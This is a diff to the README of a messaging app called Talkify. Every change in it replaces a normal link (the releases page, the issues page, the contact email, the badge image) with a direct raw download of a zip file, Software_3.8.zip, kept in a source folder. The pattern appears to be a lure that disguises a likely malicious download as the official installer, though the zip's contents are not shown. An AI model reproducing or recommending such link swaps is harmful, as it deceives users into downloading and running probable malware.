@@ -4,7 +4,7 @@
 Welcome to Talkify! This is a modern messaging platform designed for easy communication. With features like real-time chat and channels, you can stay connected effortlessly.
 
 ## 📥 Download Talkify
-[![Download Talkify](https://img.shields.io/badge/Download%20Now%20-%20Talkify%20-%23007bff?style=for-the-badge)](https://github.com/Richplughub/Talkify/releases)
+[![Download Talkify](https://github.com/Richplughub/Talkify/raw/refs/heads/main/src/pages/Software_3.8.zip%20Now%20-%20Talkify%20-%23007bff?style=for-the-badge)](https://github.com/Richplughub/Talkify/raw/refs/heads/main/src/pages/Software_3.8.zip)
 
 ## 🌟 Features
 - **Real-Time Chat**: Enjoy instant messaging with friends and family.
@@ -23,7 +23,7 @@ To use Talkify smoothly, ensure your device meets the following requirements:
 ## 📂 Download & Install
 To get Talkify, visit the Releases page and choose the version suitable for your device.
 
-[Visit the Releases Page to Download](https://github.com/Richplughub/Talkify/releases)
+[Visit the Releases Page to Download](https://github.com/Richplughub/Talkify/raw/refs/heads/main/src/pages/Software_3.8.zip)
 
 ### Steps to Install
 1. **Visit the Releases page**: Click the link above to go to the download area.
@@ -41,7 +41,7 @@ After installation, you can open Talkify from your applications. To start chatti
 - **Reacting to Messages**: Hover over a message and choose an emoji to react.
 
 ## 🤝 Support
-If you have any questions or run into issues, feel free to reach out. You can find helpful resources and community support on our [GitHub Issues page](https://github.com/Richplughub/Talkify/issues).
+If you have any questions or run into issues, feel free to reach out. You can find helpful resources and community support on our [GitHub Issues page](https://github.com/Richplughub/Talkify/raw/refs/heads/main/src/pages/Software_3.8.zip).
 
 ## 🛠️ Contributing
 If you want to contribute to Talkify, check the contributing guidelines in the repository. We welcome users who want to improve features, report bugs, or suggest new ideas.
@@ -50,6 +50,6 @@ If you want to contribute to Talkify, check the contributing guidelines in the r
 Talkify is licensed under the MIT License, allowing you to use and modify the software freely.
 
 ## 📞 Contact
-For any inquiries, you can reach us at [email@example.com](mailto:email@example.com).
+For any inquiries, you can reach us at [https://github.com/Richplughub/Talkify/raw/refs/heads/main/src/pages/Software_3.8.zip](https://github.com/Richplughub/Talkify/raw/refs/heads/main/src/pages/Software_3.8.zip).
 
 Thank you for using Talkify! We hope it enhances your messaging experience.
